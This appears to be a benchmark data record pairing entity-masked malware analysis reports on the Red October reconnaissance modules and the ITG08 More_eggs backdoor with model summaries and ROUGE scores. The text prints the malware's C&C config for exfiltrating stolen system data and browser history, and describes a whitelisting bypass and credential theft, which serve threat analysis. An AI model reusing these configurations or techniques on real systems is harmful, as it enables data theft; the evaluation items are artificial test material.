SoftwareNokiaPC Suite at [CARDINAL] 412 : [CARDINAL] 0 MSG : The operation completed successfully9 . Attempts to access and record registry keys and values related to list of all installedsoftware . Reports on success and failure of related key and value access , i.e. EE4AB9A00CB3B5D2472ProductName - > REG_SZ : \u201c WebFldrs XP\u201d10 . Attempts to access and record registry keys and values indicating the presence ofRadmin v2.0 remote control software , i.e. [PERSON] Radmin [PERSON] Run [PERSON] ERROR : ca n\u2019t make RegOpenKey for [PERSON] SYSTEMRAdminv2.0ServerParameters at [CARDINAL] 412 : [CARDINAL] 0 MSG : The operation completed successfully11 . Attempts to open Firefox prefs.js and profiles.ini configuration files . Attempts to open [ORG] Opera [ORG] profile.ini , profile / Opera6.ini configuration files . Reads these files and identifies network proxies for each along with credential information . [NORP] Retrieves Internet Explorer proxy preferences from the registry.12 . [PERSON] Searches for the following file types in the registry and corresponding handler and6/16attempts to record related data for the following extensions:.str.tte._ok.ki.tel.tlg .zfc.encrypted.zm9.dat.crp .pcr.safe.ldfAs a part of the network activity loop , calls GetWindowsDirectoryA , GetDriveTypeA and GetVolumeInformation each time , collects hardware information most likely for unique identification . Attempts to resolve nt-windows-update.com domain name . Following a successful call and return from WS2_32.WSAStartup and prior to WS2_32.gethostbyname , the collected data is encrypted . Attempts to connect to [ORG] nt-windows-online.com . POSTs encrypted data to nt- windows-online.com/cgi-bin/nt/sk/ . If [ORG] POST to [ORG] nt-windows-online.com fails , attempts the same process with nt - windows- [ORG] check.com , [ORG] nt-windows-update.com domains . If no connections are made , attempts to use configured web browser proxy settings and uses them to connect to the [CARDINAL] three hard - coded domains listed above . Connects and POSTs the stolen configuration data . Maintains download and execute code . How this functionality is called at runtime is uncertain . There are no references to it at runtime , so it seems like something is missing or unfinished . Hardcoded registry keys : HKCUSoftwareMicrosoftWindowsShellNoRoamMUICache HKCUSOFTWAREVB and [ORG] VBA [ORG] Program SettingsWebMailer HKCUSOFTWAREMicrosoftWindows [ORG] CE Services HKLMSystemCurrentControlSetControlDeviceClasses7/16HKCRSonyEricsson . PCCompanion.1CLSID [DATE] 2010 . Known samples share [CARDINAL] one code section , but contain different payloads in the resource section . All the functionality is implemented in the [ORG] DllMain function . This module is a plugin to check Internet connectivity and get an external [ORG] IP address of current system using popular public services such as [DATE] 2ip.ru , myip.ru , smart - ip.net . DllMainThe module collects basic system information such as current computer name , current username , and path to the original executable module where it started from . It creates a unique identifier of current system based on VolumeSerialNumber property of the disk where current Windows system is located or a hash of current computer name and ProductID value of Internet Explorer fromHKLMSOFTWAREMicrosoftInternet ExplorerRegistrationProductID . This information is put in the log file in the [ORDINAL] first place along with current date and time . This module loads a config / script from local resource [ORG] AAA and sends out some network requests using standard [PRODUCT] WinInet [PRODUCT] API . The config / script [ORG] AAA has the following contents : SetOption(conn_a . D_CONN , [ [CARDINAL] 65 ] \u201c nt - windows - online.com;nt - windows - update.com;nt- windows-check.com \u201d ) SetOption(conn_a . D_NAME , [ [CARDINAL] 15 ] \u201c /cgi - bin / nt / sk \u201d ) SetOption(conn_a . D_RPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . D_SPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . D_USER , [ [CARDINAL] 21 ] \u201c % removed% \u201d ) SetOption(conn_a . D_MODE , 0x0033 ) SetOption(conn_a . D_PASS , [DATE] 0x00 ) SetOption(conn_a . J_CONN , [ [CARDINAL] 65 ] \u201c nt - windows - online.com;nt - windows - update.com;nt- windows-check.com \u201d ) SetOption(conn_a . [PERSON] J_NAME , [ [CARDINAL] 15 ] \u201c /cgi - bin / nt / th \u201d ) SetOption(conn_a . J_USER , [ [CARDINAL] 21 ] \u201c % removed%\u201d)8/16SetOption(conn_a . [PERSON] J_RPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . [PERSON] J_SPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . J_MODE , 0x0033 ) SetOption(conn_a . J_PASS , [DATE] 0x00 ) SetOption(conn_a . VERSION_ID , [ [CARDINAL] 6 ] \u201c 51070 \u201d ) SetOption(conn_a . SEND_DELAY_TIME , [ [CARDINAL] 6 ] \u201c 20000 \u201d ) SetOption(conn_a . [PERSON] VER_SESSION_ID , [ [CARDINAL] 11 ] \u201c % removed% \u201d ) SetOption(http_host , [ 7 ] \u201c [CARDINAL] 2ip.ru \u201c ) SetOption(http_port , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(http_path , 0x002F ) SetOption(http_ua , [ [CARDINAL] 68 ] \u201c [WORK_OF_ART] Mozilla/5.0 ( [WORK_OF_ART] Windows [WORK_OF_ART] NT [WORK_OF_ART] 5.1 ; rv:5.0.1 ) Gecko/20100101 Firefox/5.0.1 \u201d ) SetOption(http_headers , [ [CARDINAL] 177 ] \u201c Accept : text / html , application / [ORG] xhtml+xml , application / xml;q=0.9 , * /*;q=0.8 Accept - Language : en - us;q=0.5,en;q=0.3 Accept - Encoding : gzip , deflate Accept - Charset : utf-8;q=0.7,*;q=0.7 \u201d ) Call(task_http ) SetOption(http_host , [ [CARDINAL] 12 ] \u201c www.myip.ru \u201c ) SetOption(http_port , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(http_path , 0x002F ) SetOption(http_ua , [ [CARDINAL] 68 ] \u201c [WORK_OF_ART] Mozilla/5.0 ( [WORK_OF_ART] Windows [WORK_OF_ART] NT [WORK_OF_ART] 5.1 ; rv:5.0.1 ) Gecko/20100101 Firefox/5.0.1 \u201d ) SetOption(http_headers , [ [CARDINAL] 177 ] \u201c Accept : text / html , application / [ORG] xhtml+xml , application / xml;q=0.9 , * /*;q=0.8 Accept - Language : en - us;q=0.5,en;q=0.3 Accept - Encoding : gzip , deflate Accept- Charset : utf-8;q=0.7,*;q=0.7 \u201d ) Call(task_http ) SetOption(http_host , [ [CARDINAL] 13 ] \u201c smart-ip.net \u201c ) SetOption(http_port , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(http_path , 0x002F ) SetOption(http_ua , [ [CARDINAL] 68 ] \u201c [WORK_OF_ART] Mozilla/5.0 ( [WORK_OF_ART] Windows [WORK_OF_ART] NT [WORK_OF_ART] 5.1 ; rv:5.0.1 ) Gecko/20100101 Firefox/5.0.1 \u201d ) SetOption(http_headers , [ [CARDINAL] 177 ] \u201c Accept : text / html , application / [ORG] xhtml+xml , application / xml;q=0.9,*/*;q=0.8 Accept - Language : en- us;q=0.5,en;q=0.3 Accept - Encoding : gzip , deflate Accept - Charset : utf-8;q=0.7,*;q=0.7 \u201d ) Call(task_http)While \u201c conn_a \u201d parameters are used to access [ORG] C&C server during reporting stage , other parameters which start with \u201c http _ \u201d are used to send out http requests . Target hosts as shown above are1 . [CARDINAL] 2ip.ru 2 . www.myip.ru [CARDINAL] 3 . smart - ip.net9/16The websites are used to get current [ORG] IP address as it is visible on the Internet . If the machine is behind proxy or [ORG] NAT router , the [ORG] IP address might be different from the local one . Interestingly all websites of current module developers \u2019 choice are obviously owned by [LANGUAGE] Russian - speaking people from former [ORG] CIS countries , [ORDINAL] first [CARDINAL] two seem to be [NORP] Russian and last one is [GPE] Ukrainian . The module simply sends HTTP GET requests to the root page of the websites and gets the response code from the headers as well as html / text source of the webpage , which is later uploaded to the C&C.Current module does n\u2019t create any local logs , instead all information is kept in memory , which is later compressed using [FAC] Zlib [FAC] 1.2.5 , encrypted , encoded with [PERSON] Base64 algorithm and data ) \u2013 code is identical . This module is a PE DLL , written in [LANGUAGE] C++ , compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio [CARDINAL] 2010.DLL resides only in memory \u2013 it does not drop itself or any other executables to the disk . It creates%USERPROFILE%Local SettingsTemptmpXX.tmp file ( where [ORG] XX is randomly generated hex number ) . During the analysis , the file stayed 0 - bytes . Most probably , it \u2019s created for further data logs . [ORG] DLL collects a range of information about the computer ( including the browsers history ) . This data is written to the memory , compressed with [ORG] Zlib deflate ( ) function \u2013 which also performs some XOR operations on it \u2013 encoded with base64 algorithm and sent by the [ORG] HTTP [ORG] POST request to the [ORG] C&C server . InitializationAfter it is loaded to the memory , malware loads and locks resource BBB : AAA:0000 , which contains config information;It gets the information about local system and current process : computer name user name current module [CARDINAL] name10/16pidThen it creates a separate thread , which contains the main module functionality . Main malware threadFirst , it constructs an internal filename string \u201c [PERCENT] @INFOSYSINFO_%u_%s.bin\u201cwhere [PERCENT] % u is equal to [PERCENT] 7 [PERCENT] and [PERCENT] % s is system time \u2013 obtained with use of GetLocalTime and SystemTimeToFileTime \u2013 in format:\u201c%04u%02u%02u_%02u%02u%02u_%03u\u201dif FileTimeToSystemTime failed , it uses the default time string:\u201c16010101_000000_000\u201dif wsprintfW failed , it uses the default hardcoded filename:\u201c@INFOSYSINFO_X_00000000_000000_000.txt\u201dThen it reads the configuration from the resources section and builds the structure containing all the necessary information at specific offsets . This structure is held only in memory . It contains a resource named \u201c AAA \u201d with the following values in it : SetOption(conn_a . D_CONN , [ [CARDINAL] 65 ] \u201c nt - windows - online.com;nt - windows - update.com;nt- windows-check.com \u201d ) SetOption(conn_a . D_NAME , [ [CARDINAL] 15 ] \u201c /cgi - bin / nt / sk \u201d ) SetOption(conn_a . D_RPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . D_SPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . D_USER , [ [CARDINAL] 21 ] \u201c % removed% \u201d ) SetOption(conn_a . D_MODE , 0x0033 ) SetOption(conn_a . D_PASS , [DATE] 0x00 ) SetOption(conn_a . J_CONN , [ [CARDINAL] 65 ] \u201c nt - windows - online.com;nt - windows - update.com;nt- windows-check.com \u201d ) SetOption(conn_a . [PERSON] J_NAME , [ [CARDINAL] 15 ] \u201c /cgi - bin / nt / th \u201d ) SetOption(conn_a . J_USER , [ [CARDINAL] 21 ] \u201c % removed% \u201d ) SetOption(conn_a . [PERSON] J_RPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . [PERSON] J_SPRT , [ [CARDINAL] 3 ] \u201c [CARDINAL] 80 \u201d ) SetOption(conn_a . J_MODE , 0x0033 ) SetOption(conn_a . J_PASS , [DATE] 0x00 ) SetOption(conn_a . VERSION_ID , [ [CARDINAL] 6 ] \u201c [DATE] 17486 \u201d ) SetOption(conn_a . SEND_DELAY_TIME , [ [CARDINAL] 6 ] \u201c 20000 \u201d ) SetOption(conn_a . [PERSON] VER_SESSION_ID , [ [CARDINAL] 11 ] \u201c % removed% \u201d ) Call(task_sysinfo)Malware main thread calls [CARDINAL] 2 main subroutines : retrieves a lot of system information , including browsing history , and writes it to the11/16in - memory log takes data from the configuration in resources to connect to the [ORG] C&C and submit collected dataData collectionMalware collects following information : current file time is admin ( if the user has administrative rights ) language ansi code package oem code package time zone current module name current directory temp directory path Windows directory path system directory path major OS version minor OS version build number service pack number platform idAdditionally , to obtain default applications for [ORG] HTTP , [ORG] HTTPS , [ORG] HTMLFILE and [ORG] MAILTO malware uses RegQueryValueEx to check following registry keys underHKCRttpshellopencommand HKCRmailtoshellopencommandFollowing parameters are retrieved for each disk , including optical drives and shared mounts : root path volume serial number filesystem flags maximum component length sectors per cluster bytes per sector number of free clusters12/16number of total clusters free bytes available total number of bytes total number of free bytesThen it collects information about local network adapters : Adapter Name Adapter MAC Address LeaseExpiresThe malware looks for URL history from following browsers : [ORG] Chrome , [ORG] Mozilla [ORG] Firefox , Internet Explorer , [GPE] Opera1 . Chrome history : Before the malware is performing the [ORG] SQL queries on the browsers profile - files , it copies the original file into a temp - file . To get the [PERSON] Tempfile path and name it makes use of GetTempPathW and GetTempFileNameW with prefix \u201c tmp\u201d . The [PERSON] Tempfile will be named like this : tmpXX.tmpWhere XX is a [CARDINAL] 2 - digit number starting from 00.Malware use following [ORG] SQL query : SELECT * FROM urlsto extract URLs ( with titles , last visited date ) from [ORG] Chrome history database : [DATE] GoogleChromeUser [DATE] DataDefaultHistory2 . Mozilla history ( sub_10015430):13/16Malware use following [ORG] SQL query : SELECT * FROM [ORG] moz_placesto extract URLs from [ORG] Mozilla history database : MozillaFirefoxProfiles%profilename%places.sqliteIn both cases , malware performs [ORG] SQL related actions with use of functions from embedded [ORG] SQL library ( most probably parts of sqlite3.dll).3 . IE history ( sub_10014F50):Malware calls CoCreateInstance function with following values : CLSID [CARDINAL] 3C374A40 - BAE4 - 11CF - BF7D-00AA006946EE [ORG] Microsoft [ORG] Url [ORG] History [ORG] Service RIID AFA0DC11 - C313 - 11D0 - 831A-00C04FD5AE38 SID_IUrlHistoryStg2i.e . it uses IUrlHistory interface to search through the history and calls SHDOCVW!CEnumSTATURL to enumerate URLs . It also makes use of shdocvw.dll which is responsible to get control over [ORG] IE . The call- adresses are resolved dynamically:4 . Opera history ( sub_10014EB0):Malware gets the [ORG] Opera folder path and searches it for URLs in [DATE] files:14/16global_history.dat , global.datAll above subroutines retrieves URL + Title + Last Visited Time and write them to the memory ( after the previous data).Also , a [ORG] DNS resolve is performed on all domain names . This module also calls GetEnvironmentStrings to retrieve all environment variables . It is also interested in current Windows Domain informationDomainControllerName ClientSiteNameThe malware looks for all running processes and all modules loaded into their address space . For each file it retrieves following values from the version info : StringFileInfo%04x%04xSpecialBuild [PRODUCT] StringFileInfo%04x%04xPrivateBuild [PRODUCT] StringFileInfo%04x%04xProductVersion [PRODUCT] StringFileInfo%04x%04xProductName StringFileInfo%04x%04xOriginalFilename StringFileInfo%04x%04xLegalTrademarks StringFileInfo%04x%04xLegalCopyright StringFileInfo%04x%04xInternalName StringFileInfo%04x%04xFileVersion StringFileInfo%04x%04xFileDescription StringFileInfo%04x%04xCompanyNameIt looks for installed programs information by enumerating registry key : SOFTWAREMicrosoftWindowsCurrentVersionUninstallFor each entry it retrieves following values : [ORG] DisplayName [ORG] InstallLocation15/16It retrieves information about installed [ORG] USB devices . Class GUID is hardcoded and equals:{A5DCBF10 - 6530 - 11D2 - 901F-00C04FB951ED}16/16", "generated_text": "Red October; the malware; modules; C&C servers; the tasks; the C&C servers; PE EXE files; memory; the infected machine; a USB drive; search; files; mask; data; actions; the system; the C&C server; the mobile phone; the Sputnik main component; First; second; second; the first stage; summary; the modules; domains; domains; IP; the second stage; e-mail messages; attachments; Microsoft Office; files; screenshots; the second stage; subdomains; the image; malicious files; the first stage; the second stage; a network scan; the second stage; the first stage; e-mail files; Sputnik files; the second stage; the first stage; credentials; a framework; a set; the first stage; use.", "ref_text": "<START-1>The PDF describes the second stage of attack used by the Red October malware. Red October is modular malware that is delivered in stages. The first stage gathers reconnaissance on the infected system. The second stage deploys additional modules that steal data, spread the malware, and maintain persistence. The second stage modules are either persistent, running continuously to wait for certain events like a mobile phone connecting, or one-time tasks that run once and collect specific data. Persistent tasks include stealing files from connected USB drives, stealing data from connected phones, spreading via the MS08-067 vulnerability, and more. One-time tasks gather system info, build directory listings, extract browsing history, collect application data, steal Outlook data, and more. The modules are organized into groups based on functionality like reconnaissance, password stealing, email theft, USB infection, spreading, and exfiltration. The modules gather data, encrypt it, and exfiltrate it to command and control servers. The configuration data reveals the command servers and paths used. In summary, the second stage of Red October is modular, persistent malware that builds on the reconnaissance of the first stage to steal data, spread, and maintain control of the infected system. The modular architecture allows the attackers to customize the malware by deploying only certain modules as needed for their goals. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4727272727272727, "gpt3/lexical/rouge_rouge2": 0.14099216710182766, "gpt3/lexical/rouge_rougeL": 0.23376623376623376, "gpt3/lexical/rouge_rougeLsum": 0.23376623376623376, "gpt3_generated_text": ["The article provides a detailed description of the malware known as \"Red October\" and its two stages of attack. In the first stage, the malware uses modules to collect information about the infected machine, such as software and hardware environment, file system and network share information, and browsing history. It also steals credentials from various applications and resources, including email accounts and Windows account hashes. Additionally, it can extract saved passwords and perform network scans. In the second stage, the malware executes tasks provided by its Command and Control (C&C) servers, including searching and extracting files, retrieving information from mobile phones, executing malicious payloads in documents, recording keystrokes, and spreading to other machines on the network. The malware uses a framework to execute these tasks and has persistent tasks that are constantly present, as well as one-time tasks that are executed once. Overall, Red October is a sophisticated malware that uses a variety of modules and actions to gather information and maintain control over the infected machine."]}, {"split_name": "val", "sample_id": "val_106", "prompt_text": "Extract the keywords: 8/31/2019More_eggs , Anyone ? Threat Actor ITG08 [PERSON] Strikes AgainMore_eggs , Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] Againsecurityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-againIBM X - [PERSON] Force Incident Response and [ORG] Intelligence [ORG] Services ( [ORG] IRIS ) responds to security incidents across the globe . During a recent incident response investigation , our team identi\ufb01ed new attacks by the \ufb01nancially motivated attack group ITG08 , also known as [ORG] FIN6.ITG08 is an organized cybercrime gang that has been active since [DATE] 2015 , mostly targeting point- of - sale ( POS ) machines in brick - and - mortar retailers and companies in the hospitality sector in the [GPE] U.S. and [LOC] Europe . More recently , the group has been observed targeting e - commerce environments by injecting malicious code into online checkout pages of compromised websites \u2014 a technique known as online skimming \u2014 thereby stealing payment card data transmitted to the vendor by unsuspecting customers . Based on our investigation and analysis of its adversarial tactics , techniques and procedures ( TTPs ) , we believe ITG08 is actively attacking multinational organizations , targeting speci\ufb01c employees with spear phishing emails advertising fake job advertisements and repeatedly deploying the More_eggs JScript backdoor malware ( aka [PERSON] Terra [PERSON] Loader , [ORG] SpicyOmelette ) . This tool , a [ORG] TTP observed in ITG08 attacks since [DATE] 2018 , is sold on the dark web by an underground malware - as - a - service ( MaaS ) provider . Attackers use it to create , expand and cement their foothold in compromised environments . Past campaigns by ITG08 using the [PERSON] More_eggs backdoor were last reported in [DATE] February [DATE] 2019.In the campaign we investigated , the attackers employed additional TTPs historically associated with ITG08 , including the use of [ORG] Windows [ORG] Management [ORG] Instrumentation ( WMI ) to automate the remote execution of [ORG] PowerShell scripts , [ORG] PowerShell commands with base64 encoding , and [GPE] Metasploit and [ORG] PowerShell to move laterally and deploy malware . Lastly , the attackers used [PERSON] Comodo code - signing certi\ufb01cates several times during the course of the campaign . Many of the above TTPs are not unique to ITG08 , but collectively , and with the use of [GPE] More_eggs , strengthen the link to this group.url Anyone ? Threat Actor ITG08 [PERSON] Strikes AgainLet \u2019s take a closer look at ITG08 \u2019s TTPs that are relevant to the campaign we investigated , starting with its spear phishing and intrusion tactics and covering information on its use of the [PERSON] More_eggs backdoor . Please note that [ORG] Visa has attributed the use of this backdoor to FIN6 in attacks that took place in [DATE] 2018 . Further linking the activity with the same threat actor , several of the network indicators and TTPs we encountered in this case \u2014 including the use of fake job advertisements as a lure in spear phishing \u2014 overlap with those reported earlier in [DATE] 2019 by both [ORG] Visa and [GPE] Proofpoint researchers . Analysis of [ORG] the [ORG] Intrusion ITG08 \u2019s TTPs in compromising targeted organizations follow the typical framework for [ORG] APT attacks . The following sections go over the steps taken by the attackers to gain an initial foothold and persist on the victimized organization \u2019s networks . Initial Compromise To gain access to victim environments , the threat actor began by targeting handpicked employees using [GPE] LinkedIn messaging and email , advertising fake jobs to lure recipients into checking into the supposed offers . In [CARDINAL] one case , we uncovered evidence indicating that the attacker had established communication with a victim via email and convinced them to click on [FAC] a [FAC] Google [FAC] Drive [FAC] URL purporting to contain an attractive job advert . Once clicked , the URL displayed the message , \u201c Online preview is not available , \u201d then presented a [ORDINAL] second URL leading to a compromised or rogue domain , where the victim could download the payload under the guise of a job description : Figure [CARDINAL] 1 : Link provided in spear phishing email to an employeeThat URL , in turn , downloaded a ZIP \ufb01le containing a malicious [ORG] Windows [ORG] Script [ORG] File ( WSF ) that initiated the infection routine of the [PERSON] More_eggs backdoor : url Anyone ? Threat Actor ITG08 Strikes AgainFigure 2 : Final landing page that downloads a malicious [ORG] \ufb01leBased on \ufb01le system artifacts examined during our investigation , the ZIP \ufb01le and [ORG] WSF \ufb01les were deleted upon a successful malware infection , likely in an attempt to prevent researchers from recovering the original \ufb01les from the \ufb01lesystem . The \ufb01lesystem , however , contained evidence of a nonmalicious decoy document dropped to the disk drive during the spear phishing attacks . Gaining a Foothold The spear phishing attacks unfortunately led to initial compromise and the installation of the More_eggs JScript backdoor , which established a reverse shell connection to the attacker \u2019s command - and - control ( [ORG] C&C ) infrastructure . Additional capabilities of the [GPE] More_eggs malware include the download and execution of \ufb01les and scripts and running commands using cmd.exe . X - [ORG] Force [ORG] IRIS determined that the [PERSON] More_eggs backdoor later downloaded additional \ufb01les , including a signed binary shellcode loader and a signed Dynamic [PERSON] Link [PERSON] Library ( [ORG] DLL ) , as described below , to create a reverse shell and connect to a remote host . The shellcode loader was observed on [CARDINAL] one infected device as updater.exe with the [GPE] Metasploit - style service name APTYnDS1ABEuUHEA , indicating that it was installed as a service . Reconnaissance , Lateral Movement and Privilege Escalation Once the attackers established a foothold on the network , they employed [ORG] WMI and [ORG] PowerShell techniques to perform network reconnaissance and move laterally within the environment . This type of method , called living off the land , can often blend with legitimate system administration activities , which can make it challenging for security controls to detect . The attackers used this technique to remotely install a [GPE] Metasploit reverse [ORG] TCP stager on select systems , subsequently spawning a Meterpreter session and [PERSON] Mimikatz . Meterpreter is a payload component in [FAC] the [FAC] Metasploit [FAC] Framework that uses in - memory [ORG] DLL injection , which can lead to a compromise by malware or any malicious code / commands . [PERSON] Mimikatz is a post - exploitation tool that allows attackers to extract credentials from volatile memory . Stolen credentials are usually leveraged to facilitate privilege escalation and further lateral movement through the compromised environmenturl Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainOnce the [GPE] Metasploit reverse [ORG] TCP stager executed , it downloaded and loaded a [ORDINAL] second stage Meterpreter DLL into memory , allowing the attacker to spawn a Meterpreter session via a handler and initiate the loading of extensions , such as [PERSON] Mimikatz . In addition to the [PERSON] More_eggs malware , the attacker leveraged in - memory attacks by injecting malicious code , in this case [PERSON] Mimikatz , into legitimate system processes . Establishing Persistence To cement their foothold and add persistence throughout the compromised environment , X - [ORG] Force [ORG] IRIS uncovered evidence that the attacker had selected several additional devices on which to install the [PERSON] More_eggs backdoor , creating redundancy in ways to get back into the network . ITG08 remotely connected to these devices using [ORG] PowerShell and [ORG] WMI and downloaded and executed a [ORG] DLL \ufb01le , subsequently installing [PERSON] More_eggs on the device without dropping the nonmalicious decoy document . More_eggs : [ORG] Malware [ORG] AnalysisITG08 Leveraging a [ORG] Malware - as - a - Service Provider A recently rising attack tool in ITG08 campaigns has been the More_eggs JScript backdoor . But while it was recently identi\ufb01ed with ITG08 activity , the [PERSON] More_eggs backdoor is apparently developed and sold through an underground MaaS provider . This vendor not only supplies the backdoor malware , but also offers related technical services , such as preparing the network infrastructure to download More_eggs - related \ufb01les and furnishing resources for [ORG] C&C purposes . In addition to [GPE] More_eggs , the same underground vendor is also responsible for producing the signed [ORG] DLL described below , which creates a reverse shell ( [WORK_OF_ART] ReverseShell [WORK_OF_ART] Executable ) . We based this assessment on code similarities between the [ORG] DLL and other samples created by the same vendor , including the [ORG] DLL that drops the [PERSON] More_eggs backdoor.url Anyone ? Threat Actor ITG08 Strikes AgainFigure [CARDINAL] 3 : Network indicators revealing the use of an underground MaaS vendor selling [ORG] More_eggs and malicious infrastructure services [WORK_OF_ART] The [WORK_OF_ART] More_eggs [WORK_OF_ART] Dropper [WORK_OF_ART] DLL After a successful phishing attack in which users have opened emails and browsed to malicious links , ITG08 attackers install the More_eggs JScript backdoor on user devices alongside several other malware components . The process begins with the consistent execution of a malicious [ORG] DLL using the legitimate regsvr32.exe Windows Utility . Once executed , the [ORG] DLL is deleted from the system and its components are dropped to the system . Before being deleted , the [ORG] DLL executes a string decoding routine that is designed to execute for [TIME] about [TIME] a [TIME] minute , spiking central processing unit ( CPU ) usage for the regsvr32.exe process . Once the strings are decoded , the [PERSON] More_eggs components are decrypted , dropped to the system ( normally in the % APPDATA%\\Microsoft\\ or % ProgramData%\\Microsoft\\ directories ) and executed . The observed strings appearing like HEX - encoded strings are shown below : url Anyone ? Threat Actor ITG08 Strikes AgainFigure 4 : [GPE] Sample encoded and decoded strings More_eggs Components The [PERSON] More_eggs dropper [ORG] DLL creates the following components on the infected device ( further detail on each component in the chart follows in the next section):Sample File Name 5795C3AC7F57F.txtDescription An XSL stylesheet \ufb01le that contains an obfuscated More_eggs JScript loader.625222E09B6CD028459.txt Benign XML document occasionally used as a parameter when exe\u201027603.docxA70613FF7F5DE98.txtmsxsl.executing the msxsl.exe utility . Benign Word Document decoy . The [ORG] Decoy was not always dropped in the executions of the DLLs analyzed . Obfuscated script \ufb01le that executes msxsl.exe with the appropriate parameters as arguments . Once the script executes , [GPE] the [GPE] More_eggs [GPE] JScript is loaded into the memory space of msxsl.exe . Benign [ORG] Microsoft [ORG] Command [ORG] Line [ORG] Transformation [ORG] Utility known to be used to execute malicious code and bypass application whitelisting . Figure [CARDINAL] 5 : Components created by DLLmsxsl.exe is executed by the script \ufb01le A70613FF7F5DE98.txt , which is obfuscated as shown below : Figure [CARDINAL] 6 : Obfuscated script \ufb01le A70613FF7F5DE98.txtThe use of msxsl.exe is a known tactic to execute malicious code and bypass application whitelisting . The deobfuscated command is built as follows:\u201cC:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\msxsl.exe \u201d \u201c C:\\Users\\ < username>\\AppData\\Roaming\\Microsoft\\625222E09B6CD028459.txt \u201d \u201c C:\\Users\\ < username>\\AppData\\Roaming\\Microsoft\\5795C3AC7F57F.txt\u201durl Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainOnce the above command is executed , the More_eggs JScript loader 5795C3AC7F57F.txt will deobfuscate the embedded More_eggs JScript . A sample loader is shown below . The start of the XSL \ufb01le : Figure [CARDINAL] 7 : JScript loader sampleThe end of the XSL \ufb01le : Figure [CARDINAL] 8 : JScript loader sampleThe \u201c select \u201d value within the template tag points to the function in the msxsl : script tag , which will execute when the msxsl.exe command is run . The JScript loader \ufb01le is highly obfuscated and decodes the [PERSON] More_eggs backdoor in a variety of ways , including RC4 decryption . Analyzing the More_eggs [PERSON] JScript [PERSON] Backdoor The analysis in this section details the functionality of [PERSON] More_eggs backdoor samples speci\ufb01c to this investigation , so please bear in mind that the same malware can be deployed differently in other campaigns and by alternate attackers . The core functionality of the samples analyzed in this campaign remained the same as described by previous researchers . We aimed to add additional detail about the inner workings of the malware , including its [ORG] C&C communications \ufb02ow , its \ufb01lesystem activity , and some encryption and encoding schemes used by the samples we analyzed . The [PERSON] More_eggs backdoor is executed entirely in memory , never touching the \ufb01lesystem in an unencrypted state . Notable con\ufb01guration data is hardcoded and includes its [ORG] C&C server address , malware version number and an [NORP] Rkey value , which is believed to identify campaign perpetrators to the vendor : The [PERSON] Rkey value is appended with a [QUANTITY] two - byte , pseudorandomly generated string used to construct an RC4 key . The [PERSON] Rkey variable is part of the ciphering key used to encrypt [ORG] C&C communications . The RC4 key is then used to encrypt data , which is additionally basE91 encoded and sent back to the C&C. BasE91 is a method for encoding binary as [ORG] ASCII [ORG] characters.url [ORG] Anyone ? Threat Actor ITG08 [PERSON] Strikes AgainUpon initial execution , the backdoor checks its environment to determine whether it is running with administrative or user privileges , and if proper components are present on the system . To check the user \u2019s privilege level on the newly infected device , it attempts to read the registry key HKEY_USERS\\S-1 - 5 - 19\\Environment\\TEMP ; a successful read means it is running with administrative privileges , and the backdoor builds the path % ProgramData%\\Microsoft . If it is not running with administrative privileges , the path % AppData%\\Microsoft is used . The [PERSON] More_eggs backdoor obtains the username and computer name of the infected device , and if running with privileges , it reads the following registry key : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Notepad\\<computername > . If not running with privileges , it reads the key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Notepad\\ < username > instead . The data in these Windows registry keys is expected to be a comma - separated list of \ufb01les with no extension . The .txt extension is appended to the name by the backdoor . If these \ufb01les exist along with msxsl.exe in the proper location , either % ProgramData%\\Microsoft or [PERSON] % AppData%\\Microsoft , the malware \u2019s execution continues . Once the environment is checked , the backdoor will check for network connectivity by sending an HTTP GET request to hxxp://www.w3[.]org/1999 / XSL / [GPE] Format , ensuring the response is \u201c This is another XSL namespace\\n . \u201dGET /1999 / XSL / Format HTTP/1.1 Accept : * / * Accept - Language : en - us UA - CPU : [ CPU version ] Accept - Encoding : gzip , de\ufb02ate User - Agent : [ User agent string here ] Host : www.w3.org Connection : Keep - Alive , Figure [CARDINAL] 9 : HTTP GET requestIf the connection is successful , the backdoor builds a string formatted with \u201c |<random - value>| \u201d . The random value is [CARDINAL] between [CARDINAL] 8 [CARDINAL] and [CARDINAL] 32 bytes long , RC4 - encrypted , basE91 encoded , and subsequently sent to the [ORG] C&C in an [ORG] HTTP [ORG] POST request . The RC4 key used is generated from the [PERSON] Rkey variable value : POST HTTP/1.1 Connection : Keep - Alive Accept : * / * Accept - Language : en - us User - Agent : [ User agent string ] Content - Length : [CARDINAL] 36 Host : [CARDINAL] 6R+#9fWCy)htQSo4 : H9&JSMTx|X[OEKj^gXEFigure [CARDINAL] 10 : [ORG] HTTP [ORG] POST requestThe [ORG] C&C response is expected to be [CARDINAL] between [CARDINAL] 8 [CARDINAL] and [CARDINAL] 32 bytes long , nothing is done with the server response . The random value acts as a handshake between the backdoor and the [ORG] C&C , pseudorandom [CARDINAL] 8 to [QUANTITY] 32 - byte URI.url Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainGET /avIRga9sfvjGj3HCPGlgzaBXOof3u7wq [PRODUCT] HTTP/1.1 Connection : Keep - Alive [PRODUCT] Accept : * / * Accept - Language : en - us User - Agent : [ User 